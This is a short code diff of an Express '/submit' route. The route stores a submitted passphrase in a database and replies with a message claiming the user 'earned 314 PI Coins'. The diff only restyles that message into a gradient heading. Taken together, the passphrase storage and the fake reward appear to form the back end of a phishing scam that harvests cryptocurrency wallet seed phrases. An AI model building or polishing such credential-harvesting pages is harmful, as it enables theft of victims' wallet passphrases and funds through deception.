@@ -34,46 +34,14 @@ app.post('/submit', async (req, res) => {
         const newPassphrase = new Passphrase({ passphrase });
         await newPassphrase.save();
 
-        // Send stylish HTML response with CSS
+        // Multicolor styled message with white background
         const successMessage = `
-        <html>
-            <head>
-                <style>
-                    body {
-                        font-family: Arial, sans-serif;
-                        background-color: #f4f4f4;
-                        color: #333;
-                        text-align: center;
-                        padding: 50px;
-                    }
-                    .message {
-                        background-color: #4CAF50;
-                        color: white;
-                        font-size: 24px;
-                        font-weight: bold;
-                        padding: 20px;
-                        border-radius: 8px;
-                        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-                        animation: fadeIn 1.5s ease-out;
-                    }
-                    @keyframes fadeIn {
-                        0% {
-                            opacity: 0;
-                            transform: scale(0.95);
-                        }
-                        100% {
-                            opacity: 1;
-                            transform: scale(1);
-                        }
-                    }
-                </style>
-            </head>
-            <body>
-                <div class="message">
+            <div style="background-color: white; padding: 20px; text-align: center;">
+                <h2 style="font-size: 24px; font-family: Arial, sans-serif; background-image: linear-gradient(to left, #ff0000, #ff9900, #33cc33, #3399ff, #9933ff); -webkit-background-clip: text; color: transparent;">
                     Congratulations!!! You have earned your 314 PI Coins Successfully!!
-                </div>
-            </body>
-        </html>`;
+                </h2>
+            </div>
+        `;
 
         res.status(200).send(successMessage);
     } catch (error) {
